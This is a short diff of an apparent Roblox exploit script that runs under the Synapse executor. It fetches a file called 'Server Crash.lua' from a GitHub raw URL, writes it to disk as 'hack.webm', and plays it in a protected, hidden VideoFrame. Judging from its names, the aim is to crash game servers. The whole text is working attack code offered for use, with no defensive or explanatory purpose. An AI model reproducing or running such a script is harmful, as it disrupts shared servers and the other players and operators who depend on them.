@@ -2,7 +2,7 @@ if not syn then return end
 local gui = Instance.new("ScreenGui")
 local s = Instance.new("VideoFrame",gui)
 syn.protect_gui(gui)
-local data = game:HttpGet("https://raw.githubusercontent.com/casualdegenerate/rblx/main/Crash(1).lua")
+local data = game:HttpGet("https://raw.githubusercontent.com/casualdegenerate/rblx/main/Server Crash.lua")
 writefile("hack.webm",data)
 gui.Parent = game:GetService("CoreGui")
 s.Video = getsynasset('hack.webm')
